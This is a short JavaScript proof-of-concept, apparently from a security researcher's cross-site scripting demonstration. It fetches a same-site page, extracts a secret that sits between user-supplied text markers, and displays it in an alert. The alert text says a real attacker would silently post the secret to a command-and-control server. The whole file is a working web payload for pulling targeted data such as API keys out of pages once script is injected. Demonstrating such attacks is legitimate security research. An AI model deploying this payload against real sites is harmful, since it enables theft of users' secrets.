function inputgrabber() {
    let url, bf, af;

    if (!window.sUrlArgs) {
        url = prompt("Enter the full URL of the page on the same site where the secret is found (e.g., https://jacobriggs.io/page).");

        if (url) {
            bf = prompt("Enter the exact text that appears immediately before the secret on the page. For example, if the secret is '1234' and the text before it is 'Your API key is', enter 'Your API key is'.");
            if (bf) {
                af = prompt("Enter the exact text that appears immediately after the secret on the page. For example, if the secret is '1234' and the text after it is 'please store this somewhere safe.', enter 'please store this somewhere safe.'.");
            }
        }
    } else {
        url = decodeURI(window.sUrlArgs[1]);
        bf = decodeURIComponent(window.sUrlArgs[2]);
        af = decodeURIComponent(window.sUrlArgs[3]);
    }

    if (url && bf && af) {
        includeHTML(url, responseText => {
            if (responseText && responseText.length > 0) {
                let start = responseText.indexOf(bf);
                let end = responseText.indexOf(af, start + bf.length);

                if (start > -1 && end > start) {
                    let secret = responseText.substring(start + bf.length, end);
                    alert(`Secret found:\n\n${secret}\n\nIn a real attack, the attacker would have silently posted this secret to a remote C2 server or location under their control. This allows an attacker to exfiltrate very specific (and potentially dynamic) data from targets.`);
                } else {
                    alert("Could not locate the secret. Please make sure the before and after texts are correct and try again.");
                }
            } else {
                alert("Unable to load the page. Please check the URL and try again.");
            }
        });
    } else {
        alert("Aborting the process. Please provide all the required information.");
    }
}

// https://stackoverflow.com/a/40113641/2123984
function includeHTML(link, callBack) {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            callBack(this.responseText);
        }
    };
    xhttp.open("GET", link, true);
    xhttp.send();
    return;
}

window.callback();
